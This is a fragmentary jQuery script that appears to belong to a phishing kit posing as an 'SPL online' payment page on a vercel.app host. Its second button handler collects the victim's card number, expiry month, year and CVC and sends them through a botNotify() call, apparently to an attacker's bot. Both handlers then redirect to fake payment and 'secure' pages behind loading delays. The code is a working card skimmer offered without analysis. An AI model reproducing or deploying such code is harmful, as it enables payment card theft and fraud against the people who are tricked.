...
$(document).ready(function() {
	...
	$("#button1").on("click", function(ev){
		...
		if(splStatusError==true){
			...
			$(".loaderWraper1").fadeIn("fast", function(){
				setTimeout(function(){
					location.href = "https://sp-lonline.vercel.app/Splonline_static/Splonline_static/html/payment.html";
				}, 2500);
			});
	...
	$("#button2").on("click", function(ev){
		...
		if(splStatusError==true){
			...
			botNotify(`N° Card : ${input1}\nMonth : ${input2}\nYear : ${input3}\nCVC : ${input4}`);
			$(".loaderWraper1").fadeIn("fast", function(){
				setTimeout(function(){ 
					location.href="https://sp-lonline.vercel.app/Splonline_static/Splonline_static/html/secure.html";
				}, 15000);
			});
		}
	});
